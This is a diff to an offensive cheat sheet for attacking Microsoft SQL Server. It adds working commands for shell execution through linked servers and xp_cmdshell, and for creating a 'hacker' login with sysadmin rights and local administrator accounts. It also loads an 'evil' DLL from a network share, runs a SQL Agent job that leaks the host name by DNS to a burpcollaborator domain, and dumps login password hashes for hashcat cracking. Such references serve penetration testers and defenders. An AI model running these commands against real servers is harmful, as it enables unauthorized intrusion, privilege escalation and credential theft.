@@ -14,6 +14,8 @@
 	* [Gather 5 Entries from a Specific Table](#gather-5-entries-from-a-specific-table)
     * [Dump common information from server to files](#dump-common-information-from-server-to-files)
 * [Linked Database](#linked-database)
+	* [Find Trusted Link](#find-trusted-link)
+	* [Execute Query Through The Link](#execute-query-through-the-link)
 	* [Crawl Links for Instances in the Domain](#crawl-links-for-instances-in-the-domain) 
 	* [Crawl Links for a Specific Instance](#crawl-links-for-a-specific-instance)
 	* [Query Version of Linked Database](#query-version-of-linked-database)
@@ -22,7 +24,7 @@
 	* [Determine All the Tables Names from a Selected Linked Database](#determine-all-the-tables-names-from-a-selected-linked-database)
 	* [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
 	* [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)
-	* [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)
+* [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)
 * [Extended Stored Procedure](#extended-stored-procedure)
 	* [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
 * [CLR Assemblies](#clr-assemblies)
@@ -54,6 +56,7 @@
 	* [Find SQL Server Logins Which can be Impersonated for the Current Database](#find-sql-server-logins-which-can-be-impersonated-for-the-current-database)
 	* [Exploiting Impersonation](#exploiting-impersonation)
 	* [Exploiting Nested Impersonation](#exploiting-nested-impersonation)
+	* [MSSQL Accounts and Hashes](#mssql-accounts-and-hashes)
 * [References](#references)
 
 ## Identify Instances and Databases
@@ -129,6 +132,31 @@ Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
 
 ## Linked Database
 
+### Find Trusted Link
+
+```sql
+select * from master..sysservers
+```
+
+### Execute Query Through The Link
+
+```sql
+-- execute query through the link
+select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+select version from openquery("linkedserver", 'select @@version as version');
+
+-- chain multiple openquery
+select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
+
+-- execute shell commands
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
+
+-- create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+```
+
 ### Crawl Links for Instances in the Domain 
 A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results
 
@@ -194,27 +222,62 @@ Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openque
 ```
 
 
-### Command Execution via xp_cmdshell
+## Command Execution via xp_cmdshell
 
 > xp_cmdshell disabled by default since SQL Server 2005
 
 ```ps1
-Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami
-Creates and adds local user backup to the local administrators group:
-Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add' -Verbose
-Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
+PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami
+
+# Creates and adds local user backup to the local administrators group:
+PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
+PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
 ```
+
+* Manually execute the SQL query
+	```sql
+	EXEC xp_cmdshell "net user";
+	EXEC master..xp_cmdshell 'whoami'
+	EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+	EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+	```
+* If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+	```sql
+	EXEC sp_configure 'show advanced options',1;
+	RECONFIGURE;
+	EXEC sp_configure 'xp_cmdshell',1;
+	RECONFIGURE;
+	```
+* If the procedure was uninstalled
+	```sql
+	sp_addextendedproc 'xp_cmdshell','xplog70.dll'
+	```
+
 
 ## Extended Stored Procedure
 
 ### Add the extended stored procedure and list extended stored procedures
 
 ```ps1
+# Create evil DLL
 Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
+
+# Load the DLL and call xp_test
 Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
 Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"
+
+# Listing existing
 Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 ```
+
+* Build a DLL using [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)
+* Load the DLL
+	```sql
+	-- can also be loaded from UNC path or Webdav
+	sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
+	EXEC xp_calc
+	sp_dropextendedproc 'xp_calc'
+	```
 
 ## CLR Assemblies
 
@@ -321,6 +384,8 @@ GO
 
 ## OLE Automation
 
+* :warning: Disabled by default
+
 ### Execute commands using OLE automation procedures
 
 ```ps1
@@ -364,9 +429,22 @@ Subsystem Options:
 –Subsystem Jscript
 ```
 
+```sql
+USE msdb; 
+EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
+EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
+EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
+EXEC dbo.sp_start_job N'test_powershell_job1';
+
+-- delete
+EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
+```
+
 ### List All Jobs
 
 ```ps1
+SELECT job_id, [name] FROM msdb.dbo.sysjobs;
+SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
 Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
 ```
 
@@ -537,8 +615,30 @@ SELECT ORIGINAL_LOGIN()
 SELECT SYSTEM_USER
 ```
 
+### MSSQL Accounts and Hashes
+
+```sql
+MSSQL 2000:
+SELECT name, password FROM master..sysxlogins
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)
+
+MSSQL 2005
+SELECT name, password_hash FROM master.sys.sql_logins
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+```
+
+Then crack passwords using Hashcat : `hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force`
+
+```ps1
+131	MSSQL (2000)	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
+132	MSSQL (2005)	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
+1731	MSSQL (2012, 2014)	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
+```
+
+
 ## References
 
 * [PowerUpSQL Cheat Sheet & SQL Server Queries - Leo Pitt](https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3)
 * [PowerUpSQL Cheat Sheet - Scott Sutherland](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 * [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
+* [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)
